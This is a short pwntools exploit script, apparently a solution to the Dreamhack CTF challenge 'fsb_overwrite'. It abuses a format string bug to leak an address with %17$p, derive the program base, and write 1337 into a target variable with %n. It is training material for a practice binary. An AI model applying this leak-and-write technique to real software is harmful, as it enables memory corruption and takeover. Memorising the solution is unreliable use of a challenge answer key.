from pwn import *

exe = ELF('./fsb_overwrite', checksec=False)
p = process(exe.path)
# p = remote("host1.dreamhack.games", 23680)

input()

# Brute
# for i in range(6, 21):
#     p.sendline(f'%{i}$p')
#     p.recvline()
# -> 15

# Leak exe
payload = b'%17$p'
p.sendline(payload)
leak = p.recvuntil(b'\n')
leak = int(leak.decode(), 16)
print("Exe leak: " + hex(leak))

# Exe base
exe.address = leak - 0x1293
print("Exe base: " + hex(exe.address))

# Format string %n to put 1337 in changeme
changeme = exe.address + 0x401c
payload = b'%1337c%8$n'
payload = payload.ljust(0x10)
payload += p64(changeme)
p.sendline(payload)

p.interactive()